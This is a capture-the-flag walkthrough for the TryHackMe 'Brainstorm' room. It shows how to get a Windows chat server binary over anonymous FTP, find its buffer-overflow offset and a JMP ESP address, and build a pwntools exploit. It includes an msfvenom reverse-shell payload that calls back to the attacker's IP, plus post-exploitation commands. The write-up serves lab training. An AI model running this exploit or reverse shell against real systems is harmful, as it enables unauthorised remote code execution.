# Brainstorm

Reverse engineer a chat program and write a script to exploit a Windows machine.

Room: https://tryhackme.com/room/brainstorm

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/brainstorm.md

---

## 1. Port Scan

Initial all-ports scan:

```bash
sudo nmap -Pn -p- --min-rate 5000 -T4 10.66.155.91 -oN nmap-allports.txt
```

Open ports found:

```text
21/tcp   open  ftp
3389/tcp open  ms-wbt-server
9999/tcp open  abyss
```

Run a targeted service scan:

```bash
sudo nmap -Pn -sC -sV -p 21,3389,9999 10.66.155.91 -oN nmap-svcs.txt
```

Port `21` was Microsoft FTP, and port `9999` was the Brainstorm chat service.

---

## 2. FTP Enumeration

Anonymous FTP login was allowed:

```bash
ftp 10.66.155.91
```

Login:

```text
Name: anonymous
Password: anonymous
```

Directory listing showed a `chatserver` directory:

```text
chatserver
```

Move into it:

```text
cd chatserver
```

Important: switch to binary mode before downloading Windows binaries.

```text
binary
prompt
mget *
bye
```

Downloaded files:

```text
chatserver.exe
essfunc.dll
```

Check them locally:

```bash
file chatserver.exe essfunc.dll
ls -lh chatserver.exe essfunc.dll
```

These files were used for local exploit development.

---

## 3. Connect to the Chat Service

Port `9999` exposed the chat server:

```bash
nc -nv 10.66.155.91 9999
```

Output:

```text
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters):
```

The vulnerable input was the message field, not the username field.

---

## 4. Local Debugging with Wine

A Windows VM with Immunity Debugger or x32dbg is cleaner, but Wine with `winedbg` also worked.

Install/use Xvfb for headless Wine:

```bash
apt install -y xvfb
```

Run the server under Wine debugger:

```bash
xvfb-run -a winedbg chatserver.exe
```

At the `Wine-dbg>` prompt, continue execution:

```text
c
```

In another terminal, confirm the local service is listening:

```bash
nc -nv 127.0.0.1 9999
```

---

## 5. Find the EIP Offset

Create a crash script using pwntools.

`crash.py`:

```python
#!/usr/bin/env python3
from pwn import *

HOST = "127.0.0.1"
PORT = 9999

context.log_level = "debug"

payload = cyclic(5000)

io = remote(HOST, PORT, timeout=5)

io.recvuntil(b"username", timeout=3)
io.sendline(b"testuser")

io.recvuntil(b"message", timeout=3)
io.sendline(payload)

io.close()
```

Run it:

```bash
python3 crash.py
```

The debugger crashed with:

```text
EIP: 75616164
```

Calculate the offset:

```bash
python3 -c 'from pwn import *; print(cyclic_find(p32(0x75616164)))'
```

Result:

```text
2012
```

So the EIP offset is:

```text
2012
```

---

## 6. Confirm EIP Control

Create a confirmation script.

`eip_test.py`:

```python
#!/usr/bin/env python3
from pwn import *

HOST = "127.0.0.1"
PORT = 9999

offset = 2012

payload  = b"A" * offset
payload += b"BBBB"
payload += b"C" * 1000

io = remote(HOST, PORT, timeout=5)
io.recvuntil(b"username", timeout=3)
io.sendline(b"testuser")
io.recvuntil(b"message", timeout=3)
io.sendline(payload)
io.close()
```

Restart the local debug server:

```bash
xvfb-run -a winedbg chatserver.exe
```

Continue:

```text
c
```

Run the test:

```bash
python3 eip_test.py
```

Debugger output confirmed control:

```text
EIP: 42424242
```

---

## 7. Find JMP ESP

The shellcode will be placed after EIP, so a `JMP ESP` instruction is needed.

Search `essfunc.dll` for `ff e4`, the opcode for `jmp esp`:

```bash
objdump -D -b pei-i386 -m i386 essfunc.dll | grep -i -B1 -A2 "ff e4"
```

Useful result:

```text
625014dd:  89 e5                 mov    %esp,%ebp
625014df:  ff e4                 jmp    *%esp
```

Use:

```text
625014df
```

In Python, pack it little-endian:

```python
jmp_esp = p32(0x625014df)
```

---

## 8. Confirm JMP ESP Works

Use an `INT3` breakpoint after the `JMP ESP`.

`jmp_test.py`:

```python
#!/usr/bin/env python3
from pwn import *

HOST = "127.0.0.1"
PORT = 9999

offset = 2012
jmp_esp = p32(0x625014df)

payload  = b"A" * offset
payload += jmp_esp
payload += b"\x90" * 16
payload += b"\xcc" * 4

io = remote(HOST, PORT, timeout=5)
io.recvuntil(b"username", timeout=3)
io.sendline(b"testuser")
io.recvuntil(b"message", timeout=3)
io.sendline(payload)
io.close()
```

Restart debugger:

```bash
xvfb-run -a winedbg chatserver.exe
```

Continue:

```text
c
```

Run:

```bash
python3 jmp_test.py
```

Debugger confirmed execution reached the buffer:

```text
0x00000000ebee99: int3
```

This proved the `JMP ESP` address worked.

---

## 9. Generate Shellcode

Generate a Windows reverse shell payload.

Replace `LHOST` with the AttackBox/VPN IP:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.66.126.65 LPORT=4444 EXITFUNC=thread -b '\x00' -f python -v shellcode
```

Bad characters used:

```text
\x00
```

---

## 10. Final Exploit

`exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

HOST = "10.66.155.91"
PORT = 9999

offset = 2012
jmp_esp = p32(0x625014df)

# Replace this block with your msfvenom shellcode output:
# msfvenom -p windows/shell_reverse_tcp LHOST=10.66.126.65 LPORT=4444 EXITFUNC=thread -b '\x00' -f python -v shellcode
shellcode =  b""
shellcode += b"PASTE_MSFVENOM_OUTPUT_HERE"

payload  = b"A" * offset
payload += jmp_esp
payload += b"\x90" * 32
payload += shellcode

io = remote(HOST, PORT, timeout=5)
io.recvuntil(b"username", timeout=3)
io.sendline(b"testuser")
io.recvuntil(b"message", timeout=3)
io.sendline(payload)
io.close()
```

Start a listener:

```bash
nc -lvnp 4444
```

Run the exploit:

```bash
python3 exploit.py
```

A reverse shell connected back:

```text
Connection received on 10.66.155.91 <port>
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

---

## 11. Post-Exploitation

Check current user:

```cmd
whoami
hostname
ipconfig
```

Search for flags:

```cmd
cd C:\
dir /s /b user.txt 2>nul
dir /s /b root.txt 2>nul
dir /s /b flag*.txt 2>nul
```

Common locations:

```cmd
dir C:\Users
dir C:\Users\<user>\Desktop
dir C:\Users\Administrator\Desktop
```

Read flags:

```cmd
type C:\Users\<user>\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

For public notes, obfuscate flags before publishing:

```text
THM{...redacted...}
```

---

## Summary

The path was:

```text
Nmap scan
→ Anonymous FTP
→ Download chatserver.exe and essfunc.dll
→ Run binary locally under Wine/winedbg
→ Fuzz message field
→ Find EIP offset: 2012
→ Confirm EIP control
→ Find JMP ESP in essfunc.dll: 0x625014df
→ Confirm JMP ESP with INT3
→ Generate msfvenom reverse shell
→ Exploit live service on port 9999
→ Get Windows shell
```

Key values:

```text
Offset: 2012
JMP ESP: 0x625014df
Bad chars: \x00
Payload: windows/shell_reverse_tcp
```
